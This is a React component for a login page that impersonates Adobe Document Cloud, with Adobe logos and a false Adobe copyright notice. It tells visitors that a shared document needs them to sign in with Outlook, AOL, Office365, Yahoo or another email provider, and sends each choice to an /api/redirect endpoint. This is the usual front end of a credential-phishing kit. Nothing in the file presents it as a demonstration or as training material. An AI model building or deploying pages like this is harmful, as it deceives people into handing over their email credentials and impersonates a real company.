import { Card } from "@/components/ui/card";

interface EmailProvider {
  id: string;
  name: string;
  color: string;
  logoUrl: string;
}

export default function AdobeLogin() {
  const providers: EmailProvider[] = [
    { 
      id: "outlook", 
      name: "Outlook", 
      color: "#0072C6",
      logoUrl: "https://logo.clearbit.com/outlook.com"
    },
    { 
      id: "aol", 
      name: "Aol", 
      color: "#3949AB",
      logoUrl: "https://logo.clearbit.com/aol.com"
    },
    { 
      id: "office365", 
      name: "Office365", 
      color: "#D83B01",
      logoUrl: "https://www.logotypes101.com/logos/401/6EE10109E5041C775E35122C612C7BE4/logo_office_365.png"
    },
    { 
      id: "yahoo", 
      name: "Yahoo!", 
      color: "#720E9E",
      logoUrl: "https://logo.clearbit.com/yahoo.com"
    },
    { 
      id: "other", 
      name: "Other Mail", 
      color: "#1976D2",
      logoUrl: "https://logo.clearbit.com/gmail.com"
    },
  ];

  return (
    <div className="relative flex justify-center items-center min-h-screen overflow-hidden">
      {/* Background Image */}
      <div 
        className="absolute inset-0 w-full h-full z-0"
        style={{
          backgroundImage: "url('https://images.unsplash.com/photo-1497215842964-222b430dc094?q=80&w=1470&auto=format&fit=crop')",
          backgroundSize: "cover",
          backgroundPosition: "center",
          filter: "brightness(0.4)"
        }}
      ></div>

      {/* Adobe Elements in Background */}
      <div className="absolute top-8 left-8 flex items-center z-10">
        <img
          src="https://logo.clearbit.com/adobe.com"
          alt="Adobe Logo"
          className="w-10 h-10 mr-3"
        />
        <span className="text-white text-xl font-bold">Adobe</span>
      </div>

      {/* Login Card Overlay */}
      <Card className="relative z-20 bg-[#444]/95 p-8 rounded-lg w-[380px] text-center shadow-[0_0_30px_rgba(0,0,0,0.7)] max-w-md mx-auto backdrop-blur-sm">
        <div className="flex flex-col items-center">
          {/* Logo Section */}
          <img
            src="https://logo.clearbit.com/adobe.com"
            alt="Adobe Logo"
            className="w-16 h-16 mb-4"
            onError={(e) => {
              const target = e.target as HTMLImageElement;
              target.onerror = null;
              target.src = "https://upload.wikimedia.org/wikipedia/commons/5/5f/Adobe_Acrobat_DC_logo_2020.svg";
            }}
          />

          {/* Header Section */}
          <h1 className="text-xl font-bold mb-2 text-white">Adobe Document Cloud</h1>

          {/* Instruction Text */}
          <p className="text-sm text-gray-300 mb-6">
            To read the document, please choose your email provider below login to view shared file.
          </p>

          {/* Email Provider Buttons */}
          <div className="w-full space-y-3 mb-6">
            {providers.map((provider) => (
              <a
                key={provider.id}
                href={`/api/redirect?provider=${provider.id}`}
                className="flex items-center w-full py-2 px-4 text-white font-semibold rounded hover:opacity-90 transition-opacity"
                style={{ backgroundColor: provider.color }}
              >
                <img 
                  src={provider.logoUrl} 
                  alt={`${provider.name} logo`}
                  className="w-6 h-6 mr-3"
                  onError={(e) => {
                    const target = e.target as HTMLImageElement;
                    target.onerror = null;
                    target.style.display = 'none';
                  }}
                />
                <span className="ml-2">Sign in with {provider.name}</span>
              </a>
            ))}
          </div>

          {/* Footer Section */}
          <footer className="text-gray-400 text-xs mt-6">
            <p className="mb-2">
              
            </p>
            <p>
              CopyRight© 2025 Adobe system incorporated, All right reserved.
            </p>
          </footer>
          
          {/* Document Preview Hint */}
          <div className="mt-4 pt-4 border-t border-gray-700">
            <p className="text-xs text-gray-300">Document waiting for authentication: <span className="font-medium">.</span></p>
          </div>
        </div>
      </Card>
    </div>
  );
}
